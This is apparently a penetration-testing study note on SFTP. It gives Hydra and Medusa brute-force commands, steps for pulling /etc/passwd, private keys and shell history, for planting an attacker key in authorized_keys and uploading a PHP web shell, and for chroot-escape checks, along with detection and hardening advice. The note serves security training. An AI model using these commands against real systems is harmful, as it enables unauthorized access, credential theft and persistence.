# SFTP

#SFTP #SSH #filetransfer #remoteaccess

## What is SFTP?

SSH File Transfer Protocol — a secure file-transfer subsystem **running over SSH** (not FTP-over-TLS, which is FTPS). Encrypted and authenticated by default. Common for managed file transfer and as a **restricted, SFTP-only account** (chroot jail) where the user can move files but not get a shell. On an engagement it's an SSH login by another name: brute/key targets, a file read/write primitive with looted creds, and — when jailed — a chroot-escape puzzle.

- Port **TCP 22** — shares the SSH daemon
- Subsystem line + jail configured in `/etc/ssh/sshd_config`
- `internal-sftp` + `ChrootDirectory` = the SFTP-only jail pattern

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|NMAP]] | `ssh-auth-methods`/`ssh2-enum-algos` — confirm password vs key-only auth on 22 |
| [[Tools/Auth/Hydra\|Hydra]] | Online password brute (`sftp://` / `ssh://`) |
| [[Tools/Auth/Medusa\|Medusa]] | Alternative brute (`-M ssh`) |

The native client is OpenSSH's `sftp` (and `scp`); it authenticates exactly like `ssh`, so key/agent/config all carry over. See [[Services/Remote Access/SSH|SSH]] for the auth surface.

---

## Enumeration

```bash
# SFTP rides SSH — enumerate the SSH daemon
nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos,sshv1 -sV <target>

# Is the SFTP subsystem even enabled / is the account jailed?
#   confirm by logging in: an SFTP-only account drops you at "sftp>" with no shell.
sftp <user>@<target>
```

---

## Connect / Access

```bash
sftp <user>@<target>
sftp -P 2222 <user>@<target>          # non-standard port
sftp -i /path/to/key.pem <user>@<target>

# Non-interactive
echo "get file.txt" | sftp <user>@<target>
sftp -b batchfile.txt <user>@<target>
```

### Key commands (inside the session)

| Command | Description |
|---|---|
| `ls` / `lls` | List remote / local dir |
| `cd` / `lcd` | Change remote / local dir |
| `get <f> [local]` / `get -r <dir>` | Download (recursive) |
| `put <f> [remote]` / `put -r <dir>` | Upload (recursive) |
| `mget *.txt` / `mput *.php` | Multi-file transfer |
| `rm` / `rename` / `mkdir` | Modify remote |
| `bye` / `quit` | Exit |

---

## Attack Vectors

### Brute force

```bash
hydra -L users.txt -P passwords.txt sftp://<target>
medusa -h <target> -U users.txt -P passwords.txt -M ssh
```

### Stolen/weak key auth

```bash
chmod 600 stolen_key.pem
sftp -i stolen_key.pem <user>@<target>
```

### Read sensitive files (unjailed account)

```bash
sftp <user>@<target>
sftp> get /etc/passwd
sftp> get /home/<user>/.ssh/id_rsa
sftp> get /etc/ssh/sshd_config
sftp> get /home/<user>/.bash_history
```

### Write SSH key (writable home / `.ssh`)

```bash
# If the SFTP user can write ~/.ssh, drop your key and upgrade to a real shell
sftp> put attacker.pub /home/<user>/.ssh/authorized_keys
ssh -i attacker <user>@<target>
```

### Upload web shell (writable web root)

```bash
sftp> cd /var/www/html
sftp> put shell.php        # then http://<target>/shell.php?cmd=id
```

### Chroot escape (SFTP-only jail)

A correct jail needs `ChrootDirectory` **owned by root and not writable by the user**. Escapes come from misconfig:

```bash
sftp> ls -la /            # is the jail root itself writable?
sftp> ls -la /bin         # SUID binaries reachable inside the jail?
```

- **Writable `ChrootDirectory`** → drop files that other processes (cron, a web server, root login scripts) execute outside the jail.
- **SUID binary inside the jail** → run it for privesc if you can also get command execution.
- **`ForceCommand internal-sftp` missing** → the account gets a full SSH shell, not SFTP-only — no jail at all.

---

## Detection & Artefacts

- **Every SFTP login is an SSH auth event** in `/var/log/auth.log` (`sshd`), and file operations are logged by the SFTP subsystem when configured with `-l INFO` (`Subsystem sftp internal-sftp -l INFO -f AUTH`) — get/put of sensitive paths shows there.
- **Brute force** = a burst of `Failed password`/`Connection closed by authenticating user` from one source.
- **A dropped `authorized_keys` or a webshell** in a writable path is the persistence artefact; a new key in `~/.ssh` for an SFTP-only account is a strong IOC.
- Defensive baseline: key-only auth, `ForceCommand internal-sftp` + a root-owned non-writable `ChrootDirectory`, `AllowTcpForwarding no`, and subsystem logging enabled.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Weak password on SFTP account | Brute force |
| No `ChrootDirectory` on SFTP users | Full-filesystem read/write |
| `ChrootDirectory` writable by the user | Chroot escape → code exec outside the jail |
| `ForceCommand internal-sftp` missing | Account gets a full SSH shell, not SFTP-only |
| Write access to web root / `~/.ssh` | Webshell upload / key implant → shell |
| Reused/looted SSH key accepted | Key theft = direct access |

---

## Quick Reference

| Goal | Command |
|---|---|
| Auth methods | `nmap -p 22 --script ssh-auth-methods host` |
| Connect (password) | `sftp user@host` |
| Connect (key) | `sftp -i key.pem user@host` |
| Download / recursive | `get file` / `get -r dir` |
| Upload | `put local_file` |
| Brute force | `hydra -L users.txt -P pass.txt sftp://host` |
| Check jail | `sftp> ls -la /` (writable root = escapable) |

---

> [!note] **See also** — [[Services/Remote Access/SSH|SSH]] (same daemon/auth surface, shells, tunnelling) and file-transfer siblings [[Services/File Xfer/Rsync|Rsync]] (`rsync -e ssh`) and [[Services/File Xfer/TFTP|TFTP]]; jail/SUID escapes tie into [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
